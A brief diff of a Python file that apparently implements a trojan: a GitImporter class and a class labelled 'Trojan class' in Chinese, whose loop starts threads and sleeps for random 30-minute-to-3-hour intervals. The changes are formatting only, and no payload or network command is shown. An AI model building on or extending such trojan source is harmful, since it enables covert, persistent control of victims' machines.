@@ -50,8 +50,6 @@ class GitImporter:
         return new_module
         
 
-
-
 class Trojan:
     """
     木马类
@@ -99,7 +97,7 @@ class Trojan:
                 thread.start()
                 time.sleep(random.randint(1, 10))
             
-            time.sleep(random.randint(30*60, 3*60*60))
+            time.sleep(random.randint(30 * 60, 3 * 60 * 60))
             
         
 if __name__ == "__main__":
